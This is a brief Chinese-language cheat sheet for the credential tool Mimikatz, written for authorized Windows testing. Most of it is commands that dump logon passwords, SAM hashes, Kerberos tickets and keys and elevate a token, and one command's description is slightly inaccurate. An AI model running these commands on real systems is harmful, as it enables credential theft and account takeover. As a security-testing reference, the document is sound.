# Mimikatz 常用用法

这篇记录 Mimikatz 的常用命令。它适合在授权 Windows 环境里做本地凭据检查、票据查看和一些内存相关验证。

## 启动后常用命令

开启调试权限。

```text
privilege::debug
```

查看登录会话。

```text
sekurlsa::logonpasswords
```

查看本地 SAM。

```text
lsadump::sam
```

查看票据。

```text
sekurlsa::tickets
```

提升当前 token。

```text
token::elevate
```

## 常见检查

导出缓存票据。

```text
sekurlsa::ekeys
```

查看补丁信息。

```text
version
```

查看命令帮助。

```text
help
```

## 小记录

Mimikatz 这类工具最容易把输出刷得很长，实际使用时先确认当前权限和目标范围，再把需要的段落单独保存。离线分析时，结果和系统时间、域名、会话状态要一起看。
